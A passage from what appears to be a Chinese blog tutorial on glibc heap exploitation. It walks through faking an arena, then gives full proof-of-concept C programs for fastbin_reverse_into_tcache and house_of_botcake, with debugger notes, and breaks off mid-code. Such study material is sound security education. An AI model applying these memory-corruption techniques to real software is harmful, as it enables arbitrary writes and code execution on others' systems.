<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate internal_function <span class="title">arena_get2</span><span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate a;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">    a = <span class="built_in">get_free_list</span>(); <span class="comment">// 调试发现返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">        <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">                narenas_limit = mp_.arena_max;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test) &#123;</span><br><span class="line">                <span class="type">int</span> n = __get_nprocs();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(n);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">        <span class="type">size_t</span> n = narenas;</span><br><span class="line">        <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(n &lt;= narenas_limit - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">catomic_compare_and_exchange_bool_acq</span>(&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">            a = _int_new_arena(size);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(a == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="built_in">catomic_decrement</span>(&amp;narenas);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            a = <span class="built_in">reused_arena</span>(avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>reused_arena</code> 从 <code>next_to_use</code> 开始沿 <code>arena.next</code> 链表找第一个满足 <code>!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex)</code> 的 <code>arena</code> ，并且会将找到的 <code>arena</code> 赋值给 <code>thread_arena</code> ，然后更新 <code>next_to_use</code> 为下一个 <code>arena</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> narenas = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">reused_arena</span><span class="params">(mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate result;</span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">    <span class="type">static</span> mstate next_to_use;</span><br><span class="line">    <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">        next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">    result = next_to_use;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">arena_is_corrupt</span>(result) &amp;&amp; !<span class="built_in">mutex_trylock</span>(&amp;result-&gt;mutex))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">        result = result-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    ...</span><br><span class="line">    thread_arena = result;</span><br><span class="line">    next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以修改 <code>main_arena.next</code> 指向伪造的 <code>arena</code> 然后两次调用 <code>malloc(0xffffffffffffffbf + 1)</code>，（第一次调用<code>result==&amp;main_arena;next_to_use==INTM</code>）; 通过 <code>checked_request2size(bytes, nb);</code> 宏使得 <code>_int_malloc</code> 返回 <code>NULL</code>，最终使得 <code>thread_arena</code> 指向我们伪造的 <code>arena</code> 。</p>
<p>首先需要确保 <code>narenas &gt; narenas_limit - 1</code> 从而调用 <code>reused_arena</code> ，因此要构造 <code>unsorted bin attack</code> 将 <code>narenas</code> 改成一个较大的数。为了确保从 <code>unsorted bin</code> 中取出的 <code>chunk</code> 能通过 <code>victim-&gt;size &gt; av-&gt;system_mem</code> 检查，我们将 <code>main_arena.system_mem</code> 赋值为<code> 0xffffffffffffffff</code> 。将 <code>INTM.bk</code> 指向 <code>&amp;narenas - 0x10</code> 构造 <code>unsorted bin attack </code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205809961.png"
                      alt="image-20231027205809961"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210017826.png"
                      alt="image-20231027210017826"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205922973.png"
                      alt="image-20231027205922973"
                ></p>
<p>申请 <code>0xa0</code> 大小的 <code>chunk</code> （申请被构造在 <code>unsorted bin</code> 的 <code>INTM</code>）触发 <code>unsorted bin attack</code>。此时 <code>arenas</code> 上被写入了 <code>&amp;main_arena.top</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210544449.png"
                      alt="image-20231027210544449"
                ></p>
<p>将 <code>main_arena.next</code> 指向 <code>INTM</code> ，连续两次 <code>malloc(0xffffffffffffffbf + 1);</code> 将 <code>thread_arena</code> 指向我们伪造的 <code>INTM</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210759803.png"
                      alt="image-20231027210759803"
                ></p>
<p>伪造如下 <code>fast_chunk</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211024351.png"
                      alt="image-20231027211024351"
                ></p>
<p>之后将 <code>(uint64_t) (INTM_prev+0x30)</code> 指向伪造的 <code>chunk</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211133139.png"
                      alt="image-20231027211133139"
                ></p>
<p>此时如果 <code>malloc(0x68)</code> 就会将目标地址处的内存申请出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211207749.png"
                      alt="image-20231027211207749"
                ></p>
<h1 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h1><p>第五部分开始使用 <code>ubuntu:18.04</code> 编译。<code>Tcache</code> 基础请看 <a class="link"   href="https://bbs.kanxue.com/thread-278105.htm" >Tcache安全机制及赛题详细解析(gundam &amp;&amp; House of Atum) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><h3 id="源码-19"><a href="#源码-19" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="built_in">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-19"><a href="#调试-19" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193723730.png"
                      alt="image-20231014193723730"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193755564.png"
                      alt="image-20231014193755564"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193900312.png"
                      alt="image-20231014193900312"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193928870.png"
                      alt="image-20231014193928870"
                ></p>
<p>首先申请 <code>14</code> 个 <code>chunk</code> ，先后将 <code>tcache</code> 和 <code>fastbinY[4]</code> 填满。其中 <code>victim</code> 指向第 <code>8</code> 个 <code>chunk</code> 也就是 <code>fastbinY[4]</code> 的最后一个 <code>chunk_ptrs[7]</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194618108.png"
                      alt="image-20231014194618108"
                > </p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194639500.png"
                      alt="image-20231014194639500"
                ></p>
<p>将 <code>victim(ptrs[7]_fd)</code> 指向 <code>stack_var[0]</code> 的位置，然后将 <code>tcache</code> 清空。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194826822.png"
                      alt="image-20231014194826822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195140863.png"
                      alt="image-20231014195140863"
                ></p>
<p>这次 <code>malloc</code> 将会先从 <code>fastbin</code> 头部取出一个 <code>chunk</code>，然后把 <code>fastbin</code> 清空，放入<code>tcache</code>中，因为 <code>fastbin</code> 取出时从头开始，<code>tcache</code> 又是 <code>FIFO</code> 结构， 所以放入 <code>tcache</code> 是倒序的，把 <code>stack_var</code> 也算做了一个 <code>chunk</code>，所以是满 <code>7</code> 个。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195254059.png"
                      alt="image-20231014195254059"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195309680.png"
                      alt="image-20231014195309680"
                ></p>
<p>此时再去申请一个 <code>0x50</code> 大小的 <code>chunk</code> 将会把 <code>stack_var</code> 取出来，此时 <code>q == stack_var[2]</code> 。</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p><code>libc-2.29</code> 新增加<code>double free</code>检查，方法是在 <code>tcache_entry</code> 结构体中新增加标志位 <code>key</code> 来检查 <code>chunk</code> 是否在 <code>tcache bin</code> 中。当 <code>free</code> 掉一个堆块进入 <code>tcache</code> 时，假如堆块的 <code>bk</code> 位存放的<code>key == tcache_key</code>， 就会遍历这个大小的 <code>Tcache</code> ，假如发现同地址的堆块，则触发 <code>double Free</code> 报错。因为 <code>chunk</code> 的 <code>key</code> 保存在 <code>bk</code> 位置，只需将其修改即可绕过 <code>double free</code> 检查。而 <code>house_of_botcake</code> 是另一种方法。</p>
<h3 id="源码-20"><a href="#源码-20" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">sizeof</span>(x)/<span class="built_in">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span 